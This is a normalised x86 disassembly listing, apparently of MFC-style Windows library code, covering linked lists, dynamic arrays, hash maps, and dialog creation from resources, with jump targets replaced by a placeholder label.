mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_43cec6
push esi
mov esi ecx
push [ esi + 0x4 ]
push 0x0
call sub_43ce55
mov ecx [ esp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi + 0x8 ] eax
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov [ esi + 0x4 ] eax
pop esi
retn 0x4
sub_43cef0
push esi
mov esi ecx
push 0x0
push [ esi + 0x8 ]
call sub_43ce55
mov ecx [ esp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] eax
mov [ ecx ] eax
jmp r-xdata
mov [ esi + 0x8 ] eax
pop esi
retn 0x4
sub_43cf19
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_43cead
mov eax esi
pop esi
retn
sub_43cf3d
mov eax [ esp + 0x4 ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov esi [ eax ]
mov [ edx ] esi
mov edx [ eax ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
push eax
call sub_43cead
pop esi
retn 0x4
sub_43cf74
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
cmp ecx [ esp + 0x4 ]
jne r-xdata
test eax eax
je r-xdata
jmp r-xdata
retn 0x8
sub_43cfca
mov eax sub_46407c
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
push [ ecx + 0x4 ]
and [ ebp - 0x4 ] 0x0
call sub_441eb2
pop ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43cff7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
cmp eax 0xffffffff
push edi
mov esi ecx
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
push [ esi + 0x4 ]
call sub_441eb2
pop ecx
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ebx [ esi + 0xc ]
cmp edi ebx
jg r-xdata
push edi
call sub_441e89
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_42dc30
add esp 0x10
mov [ esi + 0xc ] edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp edi eax
jle r-xdata
add eax ebx
cmp edi eax
mov [ ebp + 0xc ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
push 0x8
cdq
pop ecx
idiv ecx
cmp eax 0x4
jl r-xdata
mov [ esi + 0x8 ] edi
jmp r-xdata
mov edx edi
sub edx eax
add eax ecx
push edx
push 0x0
push eax
call sub_42dc30
add esp 0xc
jmp r-xdata
push [ ebp + 0xc ]
call sub_441e89
push [ esi + 0x8 ]
mov ebx eax
push [ esi + 0x4 ]
push ebx
call sub_42e2d0
mov eax [ esi + 0x8 ]
mov ecx edi
sub ecx eax
add eax ebx
push ecx
push 0x0
push eax
call sub_42dc30
push [ esi + 0x4 ]
call sub_441eb2
mov eax [ ebp + 0xc ]
add esp 0x20
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
mov [ ebp + 0xc ] edi
push 0x4
pop eax
mov ecx 0x400
cmp eax ecx
jle r-xdata
cmp eax 0x4
jge r-xdata
mov eax ecx
jmp r-xdata
sub_43d0ee
push esi
mov esi [ esp + 0x8 ]
push edi
push 0xffffffff
push [ esi + 0x8 ]
mov edi ecx
call sub_43cff7
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ edi + 0x4 ]
call sub_42e2d0
add esp 0xc
pop edi
pop esi
retn 0x4
sub_43d116
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov eax [ edi + 0x14 ]
not eax
test al 0x1
je r-xdata
mov ecx edi
call sub_447f80
push 0xffffffff
push eax
mov ecx esi
call sub_43cff7
push [ esi + 0x8 ]
mov ecx edi
push [ esi + 0x4 ]
call sub_447c75
push [ esi + 0x8 ]
mov ecx edi
call sub_447f52
push [ esi + 0x8 ]
mov ecx edi
push [ esi + 0x4 ]
call sub_447d84
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_43d1cc
mov eax sub_464bc8
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
push [ ecx + 0x4 ]
and [ ebp - 0x4 ] 0x0
call sub_441eb2
pop ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43d1f9
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
cmp eax 0xffffffff
push edi
mov esi ecx
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
push [ esi + 0x4 ]
call sub_441eb2
pop ecx
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ebx [ esi + 0xc ]
cmp edi ebx
jg r-xdata
mov ebx edi
shl ebx 0x2
push ebx
call sub_441e89
push ebx
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_42dc30
add esp 0x10
mov [ esi + 0xc ] edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp edi eax
jle r-xdata
add eax ebx
cmp edi eax
mov [ ebp + 0xc ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
push 0x8
cdq
pop ecx
idiv ecx
cmp eax 0x4
jl r-xdata
mov [ esi + 0x8 ] edi
jmp r-xdata
mov edx eax
lea eax [ ecx + eax * 4 ]
imul edx edx 0x3fffffff
add edx edi
shl edx 0x2
push edx
push 0x0
push eax
call sub_42dc30
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
shl eax 0x2
push eax
call sub_441e89
mov ebx eax
mov eax [ esi + 0x8 ]
shl eax 0x2
push eax
push [ esi + 0x4 ]
push ebx
call sub_42e2d0
mov eax [ esi + 0x8 ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx edi
lea eax [ ebx + eax * 4 ]
shl ecx 0x2
push ecx
push 0x0
push eax
call sub_42dc30
push [ esi + 0x4 ]
call sub_441eb2
mov eax [ ebp + 0xc ]
add esp 0x20
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
mov [ ebp + 0xc ] edi
push 0x4
pop eax
mov ecx 0x400
cmp eax ecx
jle r-xdata
cmp eax 0x4
jge r-xdata
mov eax ecx
jmp r-xdata
sub_43d312
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ esp + 0x10 ]
pop edi
mov [ eax + esi * 4 ] ecx
pop esi
retn 0x8
lea eax [ esi + 0x1 ]
push 0xffffffff
push eax
call sub_43d1f9
sub_43d339
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
push esi
mov esi [ ebp + 0x10 ]
mov eax [ ebx + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp edi eax
push 0xffffffff
jl r-xdata
add eax esi
mov ecx ebx
push eax
call sub_43d1f9
mov ecx edi
mov eax [ ebx + 0x4 ]
imul ecx ecx 0x3fffffff
add ecx [ ebp - 0x4 ]
shl ecx 0x2
push ecx
lea ecx [ eax + edi * 4 ]
push ecx
lea ecx [ edi + esi ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_42ea90
mov ecx [ ebx + 0x4 ]
mov eax esi
shl eax 0x2
push eax
mov eax edi
shl eax 0x2
add ecx eax
push 0x0
push ecx
call sub_42dc30
add esp 0x18
lea eax [ edi + esi ]
push eax
call sub_43d1f9
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax edi
lea ecx [ esi + 0x1 ]
shl eax 0x2
mov eax esi
dec esi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov esi [ ebp + 0xc ]
mov [ edx + eax ] esi
add eax 0x4
dec ecx
jne r-xdata
sub_43d3cb
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x8 ]
sub eax edx
sub eax edi
je r-xdata
sub [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x8
mov ecx [ esi + 0x4 ]
shl eax 0x2
push eax
lea eax [ edx + edi ]
lea eax [ ecx + eax * 4 ]
push eax
lea eax [ ecx + edx * 4 ]
push eax
call sub_42ea90
add esp 0xc
sub_43d445
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_43d183
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_441eb2
and [ esi + 0x4 ] 0x0
pop ecx
sub_43d499
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_43d163
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_43d4ff
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_43d531
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_43d564
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_43d4ff
test eax eax
je r-xdata
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push 0x1
mov [ ecx ] eax
pop eax
sub_43d586
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_43d4ff
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_43d499
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_43d6cd
sub_43d5d6
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_43d4e6
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_43d618
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_43d6cd
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_441eb2
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_441e89
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_42dc30
add esp 0x10
pop edi
sub_43d712
push ebp
push esi
mov esi ecx
xor ebp ebp
cmp [ esi + 0x4 ] ebp
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
call sub_43d183
mov [ esi + 0x14 ] ebp
pop esi
pop ebp
retn
push ebx
xor ebx ebx
cmp [ esi + 0x8 ] ebp
jbe r-xdata
push [ esi + 0x4 ]
call sub_441eb2
pop ecx
mov [ esi + 0x4 ] ebp
pop ebx
push edi
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
lea ecx [ edi + 0x8 ]
call sub_442148
mov edi [ edi ]
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edi [ eax + ebx * 4 ]
pop edi
cmp edi ebp
je r-xdata
sub_43d78d
push esi
mov esi ecx
push edi
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edi [ esi + 0x10 ]
push 0x4
push rw-data
mov eax [ edi ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] eax
lea eax [ edi + 0x8 ]
push eax
call sub_42e2d0
and [ edi + 0xc ] 0x0
add esp 0xc
mov eax edi
pop edi
pop esi
retn
push 0x10
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_43d163
mov ecx [ esi + 0x18 ]
add eax 0x4
mov edx ecx
shl edx 0x4
dec ecx
test ecx ecx
lea eax [ eax + edx - 0x10 ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0x10
dec ecx
jne r-xdata
sub_43d7ef
push esi
push edi
mov edi [ esp + 0xc ]
xor eax eax
mov esi edi
mov dl [ edi ]
xor edx edx
div [ ecx + 0x8 ]
mov eax [ esp + 0x10 ]
mov [ eax ] edx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
imul eax eax 0x21
movsx edx dl
add eax edx
mov dl [ esi + 0x1 ]
inc esi
jmp r-xdata
xor eax eax
mov esi [ eax + edx * 4 ]
test dl dl
je r-xdata
mov eax [ esi + 0x8 ]
push edi
push eax
call sub_42d51e
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
pop edi
pop esi
retn 0x8
test esi esi
je r-xdata
sub_43d845
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_43d7ef
test eax eax
je r-xdata
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
push 0x1
mov [ ecx ] eax
pop eax
sub_43d867
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_43d7ef
test eax eax
je r-xdata
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push 0x1
mov [ ecx ] eax
pop eax
sub_43d889
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
mov edi ecx
call sub_43d7ef
mov esi eax
test esi esi
jne r-xdata
lea eax [ esi + 0xc ]
pop edi
pop esi
leave
retn 0x4
cmp [ edi + 0x4 ] eax
jne r-xdata
mov ecx edi
call sub_43d78d
push [ ebp + 0x8 ]
mov esi eax
mov eax [ ebp - 0x4 ]
lea ecx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
call sub_4422d1
mov eax [ edi + 0x4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + ecx * 4 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + ecx * 4 ] esi
push 0x1
mov ecx edi
push [ edi + 0x8 ]
call sub_43d6cd
sub_43d8eb
cmp [ esp + 0x8 ] 0x110
jne r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_43e7da
push eax
push r--data
call sub_442ecc
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0xbc ]
jmp r-xdata
retn 0x10
sub_43d92b
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_43f096
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx esi
call sub_43fe5b
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ edi + 0x4 ] 0x100
jne r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
push edi
mov ecx esi
call sub_440fac
mov eax [ edi + 0x8 ]
cmp eax 0x1b
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ edi ]
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
cmp eax 0x3
jne r-xdata
push r--data
push [ edi ]
call sub_4478f3
test eax eax
je r-xdata
push 0x2
push [ esi + 0x1c ]
call [ GetDlgItem@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
sub_43d9c4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push edi
push [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x10 ]
push edi
push ebx
call sub_441aa8
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
test bh 0x80
je r-xdata
cmp edi 0xffffffff
jne r-xdata
xor eax eax
cmp ebx 0xf000
jae r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
call sub_4428ff
test eax eax
je r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
je r-xdata
sub_43da49
push esi
mov esi ecx
call sub_43e388
push 0x20
lea eax [ esi + 0x3c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_42dc30
add esp 0xc
mov eax esi
pop esi
retn
sub_43da87
mov eax sub_463030
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_43effe
sub_43dac5
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov eax ebx
push edi
mov edi ecx
shr eax 0x10
test ax ax
mov [ edi + 0x40 ] ebx
jne r-xdata
call sub_45357b
mov esi [ eax + 0xc ]
push 0x5
push ebx
push esi
call [ FindResourceA@IAT ]
push eax
push esi
call [ LoadResource@IAT ]
push esi
mov ecx edi
push [ esp + 0x18 ]
push eax
call sub_43db14
pop edi
pop esi
pop ebx
retn 0x8
cmp [ edi + 0x3c ] 0x0
jne r-xdata
movzx eax bx
mov [ edi + 0x3c ] eax
sub_43db37
mov eax [ esp + 0x8 ]
push esi
test eax eax
mov esi ecx
jne r-xdata
push [ esp + 0x14 ]
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4c ] ecx
mov ecx esi
push eax
push [ esp + 0x10 ]
call sub_43dba6
pop esi
retn 0x10
call sub_420710
sub_43db62
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
call sub_45357b
mov esi [ eax + 0xc ]
push 0x5
push [ esp + 0x14 ]
push esi
call [ FindResourceA@IAT ]
push eax
push esi
call [ LoadResource@IAT ]
test eax eax
je r-xdata
push esi
mov ecx ebx
push [ esp + 0x18 ]
push edi
call sub_43dba6
pop edi
pop esi
pop ebx
retn 0x8
push eax
call [ LockResource@IAT ]
mov edi eax
sub_43dba6
mov eax sub_46304c
call sub_42dc88
sub esp 0x34
push ebx
push esi
xor ebx ebx
push edi
cmp [ ebp + 0x10 ] ebx
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] esi
jne r-xdata
call sub_45357b
mov edi [ eax + 0x1038 ]
push 0x10
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_44121e
push 0x3c000
call sub_44121e
cmp edi ebx
je r-xdata
call sub_45357b
mov eax [ eax + 0x8 ]
mov [ ebp + 0x10 ] eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx esi
call [ eax + 0xb4 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x8 ]
call sub_44319f
add esp 0xc
xor ecx ecx
cmp eax ebx
sete cl
mov eax ecx
cmp eax ebx
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_442fee
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_443328
lea ecx [ ebp - 0x40 ]
call sub_44308b
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_44307d
cmp [ ebp - 0x14 ] ebx
je r-xdata
push 0x2a
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
or [ esi + 0x2c ] 0xffffffff
or [ esi + 0x24 ] 0x10
push esi
call sub_43ec81
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x14 ]
call [ GlobalLock@IAT ]
mov [ ebp + 0x8 ] eax
push r--data
push [ ebp - 0x1c ]
call sub_42d51e
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
push r--data
push [ ebp - 0x1c ]
call sub_42d51e
pop ecx
test eax eax
pop ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
je r-xdata
push ebx
push sub_43d8eb
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call [ CreateDialogIndirectParamA@IAT ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] bl
call sub_442148
jmp r-xdata
mov [ ebp - 0x20 ] ebx
push r--data
push [ ebp - 0x1c ]
call sub_42d51e
pop ecx
test eax eax
pop ecx
jne r-xdata
call sub_43eccd
test eax eax
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xb4 ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
test [ esi + 0x24 ] 0x10
jne r-xdata
xor eax eax
cmp [ ebp - 0x18 ] ebx
setne al
push [ ebp - 0x14 ]
call [ GlobalUnlock@IAT ]
push [ ebp - 0x14 ]
call [ GlobalFree@IAT ]
push [ ebp - 0x18 ]
call [ DestroyWindow@IAT ]
mov [ ebp - 0x18 ] ebx
sub_43ddd5
push esi
push edi
mov esi ecx
call sub_43e388
lea edi [ esi + 0x3c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_42dc30
mov eax [ esp + 0x1c ]
add esp 0xc
mov [ esi + 0x50 ] eax
mov eax [ esp + 0xc ]
movzx ecx ax
mov [ edi ] eax
mov [ esi + 0x40 ] ecx
mov eax esi
pop edi
pop esi
retn 0x8
sub_43de0e
push esi
push edi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push 0x0
mov ecx eax
call sub_4495a2
lea ecx [ esi + 0x54 ]
push ecx
push eax
call sub_449748
push esi
mov edi eax
call sub_43ec81
mov eax edi
pop edi
pop esi
retn
mov eax [ eax + 0x1c ]
sub_43de48
push esi
mov esi ecx
call sub_43eccd
mov ecx esi
call sub_43e831
push [ esi + 0x54 ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
and [ esi + 0x54 ] 0x0
call sub_45357b
mov eax [ eax + 0x4 ]
pop esi
test eax eax
je r-xdata
push 0x1
push [ esi + 0x54 ]
call [ EnableWindow@IAT ]
retn
push 0x1
mov ecx eax
call sub_4495a2
sub_43de8a
mov eax sub_463058
call sub_42dc88
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] esi
mov eax [ esi + 0x48 ]
mov edi [ esi + 0x44 ]
mov [ ebp - 0x18 ] eax
call sub_45357b
cmp [ esi + 0x40 ] 0x0
mov ebx [ eax + 0xc ]
je r-xdata
test edi edi
je r-xdata
call sub_45357b
mov ebx [ eax + 0xc ]
push 0x5
push [ esi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
mov edi eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push edi
call [ LockResource@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx esi
call sub_43de0e
mov [ ebp - 0x14 ] eax
call sub_43eccd
xor edi edi
cmp [ ebp - 0x14 ] edi
mov [ ebp - 0x20 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x4 ] edi
call sub_43ec81
push [ ebp - 0x14 ]
call sub_43e7b3
push ebx
push eax
push [ ebp - 0x18 ]
mov ecx esi
call sub_43dba6
cmp eax edi
je r-xdata
push [ ebp - 0x14 ]
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] edi
je r-xdata
test [ esi + 0x24 ] 0x10
je r-xdata
push edi
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
mov [ ebp - 0x20 ] 0x1
cmp [ ebp - 0x14 ] edi
je r-xdata
push 0x1
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
